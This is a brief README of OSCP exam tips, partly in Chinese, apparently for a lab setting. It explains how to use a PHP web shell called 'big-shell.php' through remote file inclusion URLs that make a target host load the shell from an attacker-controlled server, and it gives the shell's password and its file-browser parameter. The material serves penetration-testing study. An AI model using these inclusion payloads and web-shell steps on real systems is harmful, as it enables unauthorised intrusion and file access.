# OSCP
some tips for oscp

# big-shell.php
Usage
RFI:
- 1. `http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt`，then input the passwd `pass`
- 2. 这时候因为是 RFI 包含的此大马，所以页面会自动重载为section.php，需要手动再次进入：`http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt`，然后就可以看到大马的页面
- 3. 进入fbrowser 需要手动输入：`http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt&act=fbrowser`
